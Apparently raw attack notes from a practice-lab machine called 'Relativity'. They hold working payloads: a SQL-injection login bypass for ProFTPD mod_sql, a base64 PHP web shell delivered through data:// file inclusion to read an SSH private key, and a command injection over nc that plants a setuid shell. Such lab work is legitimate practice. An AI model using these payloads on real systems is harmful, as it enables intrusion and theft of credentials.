https://twitter.com/trbughunters/status/1279768631845494787
https://book.hacktricks.xyz/pentesting-web/file-inclusion


└─$ sudo nmap -p- -sV 172.16.227.129      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 18:43 CET
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.10% done
Nmap scan report for 172.16.227.129
Host is up (0.00041s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.2.8 - 1.2.9
22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
MAC Address: 00:0C:29:6A:3B:E0 (VMware)
Service Info: Host: Relativity; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.09 seconds


USER %') and 1=1 union select 1,1,uid,gid,homedir,shell from users; --
username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 
%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 

https://www.securityfocus.com/bid/33722/exploit

└─$ ftp 172.16.227.129
Connected to 172.16.227.129.
220 Welcome to Relativity FTP (mod_sql)
Name (172.16.227.129:kali): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 
331 Password required for %').
Password:1
230 User %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
226 Transfer complete.
ftp> 



http://172.16.227.129/0f756638e0737f4a0de1c53bf8937a08/index.php?page=artwork.php
data://text/plain,<?php phpinfo(); ?>
PD9waHAgcGhwaW5mbygpOyA/Pg==
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
data://text/plain;base64,PD9waHAgZWNobyAiYm9uam91ciEiOyA/Pg==
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=



view-source:http://172.16.227.129/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7IGVjaG8gImJvbmpvdXIiOyA/Pg==&cmd=cat%20/home/mauk/.ssh/id_rsa


└─$ 
[mauk@Relativity ~]$ id
uid=1001(mauk) gid=1001(mauk) groups=1001(mauk)


mauk@Relativity ~]$ netstat -nlp
(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:50444           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp6       0      0 :::44503                :::*           


[mauk@Relativity ~]$ cat .bash_history 
ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
su -
exit
su -
[mauk@Relativity ~]$ 


ssh kali@172.16.227.1 -R 9876:brainpan2:2222
ssh -f kali@172.16.227.1 -R 6667:127.0.0.1:6667 -N
root@kali:~# ssh -L 4444:127.0.0.1:6667 mauk@192.168.80.128 



[mauk@Relativity tmp]$ cat a
total 28
drwx------. 3 jetta jetta 4096 Jul  9  2013 .
drwxr-xr-x. 4 root  root  4096 Feb 25  2013 ..
drwxr-xr-x  2 root  root  4096 Jul  9  2013 auth_server
-rw-------. 1 jetta jetta    1 Mar  4  2013 .bash_history
-rw-r--r--. 1 jetta jetta   18 Apr 23  2012 .bash_logout
-rw-r--r--. 1 jetta jetta  193 Apr 23  2012 .bash_profile
-rw-r--r--. 1 jetta jetta  124 Apr 23  2012 .bashrc

└─$ echo "AB;chmod o+x /tmp/sh" | nc 127.0.0.1 6667

[mauk@Relativity tmp]$ ./sh -p

sh-4.2$ id
uid=1001(mauk) gid=1001(mauk) euid=1002(jetta) groups=1002(jetta),1001(mauk)